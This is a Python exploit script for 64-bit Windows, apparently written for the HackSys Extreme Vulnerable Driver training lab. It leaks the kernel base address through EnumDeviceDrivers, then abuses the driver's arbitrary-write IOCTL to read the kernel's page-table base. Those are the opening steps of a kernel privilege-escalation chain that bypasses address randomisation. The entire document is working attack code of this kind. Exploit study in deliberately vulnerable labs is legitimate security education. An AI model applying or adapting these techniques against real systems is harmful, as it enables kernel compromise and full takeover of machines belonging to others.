import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Fist structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."

get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

# Retrieving nt!MiGetPteAddress
nt_mi_get_pte_address = kernel_address + 0xb8760

print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13
print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))

# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()

www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pointer = pointer(www_pte_base)


# Getting handle to driver to return to DeviceIoControl() function
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    pointer(www_pte_base),              # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

print "[+] Leaked base of PTEs!"
print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))
